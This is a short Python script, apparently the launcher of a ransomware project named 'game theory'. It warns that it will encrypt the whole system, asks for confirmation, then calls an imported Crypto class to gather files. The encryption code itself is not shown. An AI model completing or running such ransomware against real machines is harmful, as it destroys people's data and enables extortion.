from crypto import Crypto
from termcolor import colored, cprint

KEY_SIZE = 32
IV_SIZE = 16


def main():
    input("Hello. Welcome to game theory.\nTHIS IS A MALWARE THAT WILL ENCRYPT YOUR WHOLE SYSTEM. DO NOT USE IT ON YOUR PERSONAL MACHINE. DO YOU UNDERSTAND THIS?\n\n(press enter if you understand this)")
    cprint('\nYOU WILL LOSE EVERYTHING. PRESS ENTER IF YOU ARE OK WITH THIS',
           'red', attrs=['blink'])
    input("\n")
    script = input(
        "Input the first sentence of the bee movie script below if you understand this:\n").lower()
    if script == "according to all known laws of aviation, there is no way that a bee should be able to fly.":
        crypto = Crypto(KEY_SIZE, IV_SIZE)
        files = crypto.get_files()
        print(files)


if __name__ == "__main__":
    main()
